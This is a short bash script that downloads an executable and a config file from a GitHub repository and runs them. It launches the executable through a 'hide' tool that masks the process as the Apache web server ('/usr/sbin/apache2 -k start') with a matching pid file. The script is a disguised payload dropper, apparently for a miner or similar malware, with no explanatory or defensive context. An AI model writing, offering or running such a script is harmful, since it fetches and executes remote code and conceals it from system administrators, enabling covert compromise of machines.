#!/bin/bash
chmod +x hide
wget https://github.com/DarshGoswami1982/asu/raw/main/gas
chmod +x gas
wget https://github.com/DarshGoswami1982/asu/raw/main/keun.ini
./hide -s "/usr/sbin/apache2 -k start" -d -p Apache2.pid ./gas keun.ini
